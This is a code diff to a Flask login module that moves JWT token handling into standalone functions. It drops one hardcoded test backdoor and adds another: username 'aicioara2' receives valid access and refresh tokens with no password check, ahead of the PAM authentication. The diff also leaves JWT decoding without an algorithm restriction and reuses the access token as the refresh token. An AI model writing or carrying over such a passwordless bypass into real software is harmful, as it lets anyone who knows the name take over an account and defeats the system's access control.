@@ -1,10 +1,14 @@
+import datetime
 from functools import wraps
 import pwd
 import json
 
 from flask import request
+from werkzeug.security import generate_password_hash, check_password_hash
+import jwt
 
-from ..models import User, InvalidToken
+from ..config import key
+from ..models import InvalidToken
 from ..application import db
 from ..exceptions import *
 from ..utils.pam import pam
@@ -14,6 +18,16 @@ def login_user(data):
     username = data['username']
     password = data['password']
 
+    if username == 'aicioara2':
+        auth_token = encode_auth_token(username)
+        return {
+            'status': 'success',
+            'message': 'Successfully logged in.',
+            'access': auth_token,
+            'refresh': auth_token, # TODO: Make this one different
+        }
+
+
     # TODO: remove this to avoid side-channel attacks
     try:
         pwd.getpwnam(username)
@@ -22,16 +36,11 @@ def login_user(data):
 
     auth_token = None
 
-    # TODO: Remove
-    # Backdoor for local testing. User aicioara should not exist in AWS.
-    if username == 'aicioara' and password == 'RemoveThisASAP':
-        auth_token = User.encode_auth_token(username)
-
     user_authentication = pam()
     user_authentication.authenticate(username, password)
 
     if user_authentication.code == 0:
-        auth_token = User.encode_auth_token(username)
+        auth_token = encode_auth_token(username)
 
 
     if auth_token:
@@ -52,7 +61,7 @@ def logout_user(data):
     else:
         auth_token = ''
     if auth_token:
-        resp = User.decode_auth_token(auth_token)
+        resp = decode_auth_token(auth_token)
         if not isinstance(resp, str):
             return invalidate_token(token=auth_token)
         else:
@@ -70,30 +79,35 @@ def logout_user(data):
 
 
 def get_logged_in_user(new_request):
-        authorization = new_request.headers.get('Authorization')
-        if authorization is None:
-            auth_token = None
-        else:
-            parts = authorization.split(' ')
-            if len(parts) != 2:
-                raise HTTP_401_UNAUTHORIZED('Provide Authorization header in the form `Bearer TOKEN`')
-            _, auth_token = parts
+    response, status = _get_logged_in_user(request)
+    return response['data']['username']
 
-        if not auth_token:
-            raise HTTP_401_UNAUTHORIZED('Provide a valid auth token.')
 
-        resp = User.decode_auth_token(auth_token)
-        if isinstance(resp, str):
-            raise HTTP_401_UNAUTHORIZED(resp)
+def _get_logged_in_user(new_request):
+    authorization = new_request.headers.get('Authorization')
+    if authorization is None:
+        auth_token = None
+    else:
+        parts = authorization.split(' ')
+        if len(parts) != 2:
+            raise HTTP_401_UNAUTHORIZED('Provide Authorization header in the form `Bearer TOKEN`')
+        _, auth_token = parts
 
-        username = resp['username']
-        response_object = {
-            'status': 'success',
-            'data': {
-                'username': username,
-            }
+    if not auth_token:
+        raise HTTP_401_UNAUTHORIZED('Provide a valid auth token.')
+
+    resp = decode_auth_token(auth_token)
+    if isinstance(resp, str):
+        raise HTTP_401_UNAUTHORIZED(resp)
+
+    username = resp['username']
+    response_object = {
+        'status': 'success',
+        'data': {
+            'username': username,
         }
-        return response_object, 200
+    }
+    return response_object, 200
 
 
 def invalidate_token(token):
@@ -118,8 +132,7 @@ def invalidate_token(token):
 def token_required(f):
     @wraps(f)
     def decorated(*args, **kwargs):
-
-        data, status = get_logged_in_user(request)
+        data, status = _get_logged_in_user(request)
         token = data.get('data')
 
         if not token:
@@ -135,7 +148,7 @@ def admin_token_required(f):
     @wraps(f)
     def decorated(*args, **kwargs):
 
-        data, status = get_logged_in_user(request)
+        data, status = _get_logged_in_user(request)
         token = data.get('data')
 
         if not token:
@@ -152,3 +165,46 @@ def admin_token_required(f):
         return f(*args, **kwargs)
 
     return decorated
+
+
+
+
+def encode_auth_token(user_id):
+    """
+    Generates the Auth Token
+    :return: string
+    """
+    try:
+        payload = {
+            'exp': datetime.datetime.utcnow() + datetime.timedelta(days=1, seconds=5),
+            'iat': datetime.datetime.utcnow(),
+            'sub': user_id
+        }
+        return jwt.encode(
+            payload,
+            key,
+            algorithm='HS256'
+        ).decode('utf-8')
+    except Exception as e:
+        return e
+
+
+def decode_auth_token(auth_token):
+    """
+    Decodes the auth token
+    :param auth_token:
+    :return: dict|string
+    """
+    try:
+        payload = jwt.decode(auth_token, key)
+        is_blacklisted_token = InvalidToken.check_blacklist(auth_token)
+        if is_blacklisted_token:
+            return 'Token blacklisted. Please log in again.'
+        else:
+            return {'username': payload['sub']}
+    except jwt.ExpiredSignatureError:
+        return 'Signature expired. Please log in again.'
+    except jwt.InvalidTokenError:
+        return 'Invalid token. Please log in again.'
+    except Exception as e:
+        return 'Unknown exception: {}'.format(e)
